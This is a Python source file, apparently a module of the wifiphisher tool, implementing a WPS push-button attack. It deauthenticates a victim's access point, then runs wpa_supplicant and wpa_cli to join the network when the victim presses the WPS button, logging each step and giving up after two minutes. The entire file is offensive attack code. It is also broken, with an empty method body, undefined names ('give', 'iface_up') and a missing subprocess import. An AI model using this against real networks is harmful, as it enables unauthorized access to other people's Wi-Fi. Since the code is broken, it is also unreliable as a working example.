from wifiphisher.common.constants import *
import time, threading, socket, fcntl, struct, json

class Load(object):
    pass

class Manage(object):

    """
    This class is used to determine which attack has been chosen.
    If the attack isn't valid it will throw an exception :
    NotValidAttack
    """

    def __init__(self, attack):

        """
        Setup the class with all the given arguments.

        :param self: A Manage object.
        :param attack: Which attack has been chosen.
        :type self: Manage
        :type attack: string
        :return: None
        """

        self.attack = attack
        self.attacks = ["wps_pbc"]
        self.log_file = "/tmp/wifiphisher-attacks.tmp"
        self.check()

    def check(self):

        """
        Check which attack has been chosen
        """

        if not self.attack in self.attacks :
            raise NotValidAttack(self.attack, self.attacks)
            #with open(self.log_file, "a+") as log_file:
            #    log_file.write('[' + T + '*' + W + '] ' + R + "ATTACK ACTIVATED : " +
            #                   G + self.attack)
            #    log_file.close()
            #if self.attack == "wps_pbc":
            #    wps = WPS_PBC(self.log_file)

    def provide(self):



class AttackAlreadyRunning(Exception):

    """
    Exception class to raise if an attack is already running
    """

    def __init__(self):

        message = ("An attack is currently running, you can't have"
                    "more than one attack running at the same time!\n")

        Exception.__init__(self, message)

class NotValidAttack(Exception):

    """
    Exception class to raise if the attack selected doesn't exitst.
    """

    def __init__(self, attack, attacks):

        self.attack = attack
        self.attacks = attacks
        message = ("The attack : "+self.attack+" isn't valid, check if the template\n"
                    "you are using is passing the right parameter via post request"
                    "the current attacks available are : \n"+str(self.attacks)+"\n"
                    "Make sure that in your post request after 'attack-mode=' you have "
                    "a valid attack")

        Exception.__init__(self, message)


class WPS_PBC(object):
    def __init__(self, log_file):

        """
        Setup the class with all the given arguments.

        :param self: A WPS_PBC object.
        :param log_file: The log file where to write outputs.
        :type self: WPS_PBC
        :type log_file: string
        :return: None

        Taking self.bssid, self.iface and self.deauth from Load()
        """

        self.bssid, self.iface, self.deauth = give
        self.conf_dir = "/etc/wpa_supplicant.conf"
        self.log_file = log_file
        self.core()  #start the attack

    def core(self):

        """
        This is the core of the attack
        """

        self.wpa_setup() #setup wpa_supplicant
        self.listener = threading.Thread(target=self.start_listen)
        self.listener.start() #start the listener as thread so then we stop it when we're done
        self.going = True
        while self.going : #just stay here until going != True
            continue
        self.tm.join()  #stop the timer
        self.listener.join()  #stop the listener

    def wpa_setup(self):

        """Setup"""

        sup = "sudo echo -e \"ctrl_interface=/var/run/wpa_supplicant\\"\
                "nctrl_interface_group=0\\nupdate_config=1\" > "+self.conf_dir #wpa_supplicant confs

        wpa_set = "sudo wpa_supplicant -B -Dwext -i"+self.iface+" -c"+self.conf_dir #Start wpa_supplicant
        self.iface_up() #sometimes the iface goes down after wpa_supplicant
        self.wpa_cli = "sudo wpa_cli -i "+self.iface+" wps_pbc "+self.bssid+" -B" #start listening for wps_pbc

        """Launching the commands"""

        subprocess.call([sup], shell=True)
        subprocess.call([wpa_set], shell=True)
        subprocess.call([iface_up], shell=True)

    def start_listen(self):

        """
        This listener keep running waiting for the victim
        to press wps button. It will close if it's been
        waiting for more than 2 mins.
        ( routers provide the wps_pbc function for max 2 mins )
        """
        with open(self.log_file, "a+") as log_file:
            log_file.write('[' + T + '*' + W + '] ' + R + "listener started")
            log_file.close()
        self.stop_deauth() #Stopping the deauth
        time.sleep(7) #give some time to the AP to come back

        self.tm = threading.Thread(target=self.timer)
        cli = subprocess.Popen(self.wpa_cli, shell=True, stdout=subprocess.PIPE, \
                                stdin=subprocess.PIPE, stderr=subprocess.PIPE) #start the wps listener
        self.tm.start() #start the timer

    def stop_deauth(self):

        """
        Stop deauthenticating
        """
        with open(self.log_file, "a+") as log_file:
            log_file.write('[' + T + '*' + W + '] ' + R + "deauth stopped")
            log_file.close()
        self.deauth.stop_deauthentication()

    def deauth_rest(self):

        """
        Restart the deauthentication
        """

        self.deauth.deauthenticate()

    def iface_up(self):

        """
        If the interface goes down
        """

        subprocess.call(["sudo ifconfig "+self.iface+" up"], shell=True)

    def timer(self):

        """
        This timer counts how many seconds passed
        from the start point, it checks if it's been more
        than two mins and if we are connected to the
        victim's AP.
        If it's been 2 mins or more stop everything.
        """
        with open(self.log_file, "a+") as log_file:
            log_file.write('[' + T + '*' + W + '] ' + R + "timer started")
            log_file.close()
        secs = 0
        while secs < 120 : #while it's been less than 2mins
            ip = self.check_ip() #check if we got an ip from the AP
            if not ip:
                time.sleep(1)
                secs += 1.2
            else :
                self.done() #if we did we're done
        self.stop() #it's been more than 2mins


    def check_ip(self):

        """
        Check if we got an ip from the vitcim's AP
        """

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while 1:
            try :
                ip = socket.inet_ntoa(fcntl.ioctl(
                    s.fileno(),
                    0x8915,
                    struct.pack('256s', self.iface[:15])
                )[20:24])
                break
            except IOError as e:
                if e.errno == 99:  #if we didn't get the ip return False
                    return False
                elif e.errno == 19: #if iface is down for some reasons
                    self.iface_up()
                    continue
                else :
                    return False
        return ip #return the ip we got

    def stop(self):

        """
        The stop function it's different from the done()
        function because this runs only when 2mins are passed
        and we are still not connected to the victim's AP.
        This restart the deauthentication process and change
        the variable self.going to stop the attack.
        """
        with open(self.log_file, "a+") as log_file:
            log_file.write('[' + T + '*' + W + '] ' + R + "stopped")
            log_file.close()
        self.deauth_rest()
        self.going = False
